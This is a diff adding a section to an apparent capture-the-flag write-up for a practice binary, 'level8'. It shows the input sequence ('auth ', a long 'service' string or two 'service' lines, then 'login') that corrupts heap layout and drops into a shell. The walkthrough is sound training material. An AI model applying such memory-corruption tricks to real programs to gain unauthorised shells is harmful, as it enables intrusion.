@@ -52,3 +52,31 @@ And the last one
 (gdb) x/s 0x804882d
 0x804882d:	 "login"
 ```
+To get the flag in this level you have to login as ``` `auth ` ``` the `' '` at the end of `auth` is important after this you will see the start __address__ where the string *`auth `* is put
+```
+./level8
+(nil), (nil)
+auth
+0x804a008, (nil)
+```
+After this we have two options, we can either enter *service plus any number greater than 15 (memory alignment)
+```
+service AAAAAAAAAAAAAAA OR service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+0x804a008, 0x804a018
+login
+$
+``` 
+or we can enter
+```
+~$ ./level8
+(nil), (nil)
+`auth `
+0x804a008, (nil)
+service
+0x804a008, 0x804a018
+service
+0x804a008, 0x804a028
+login
+$
+
+```
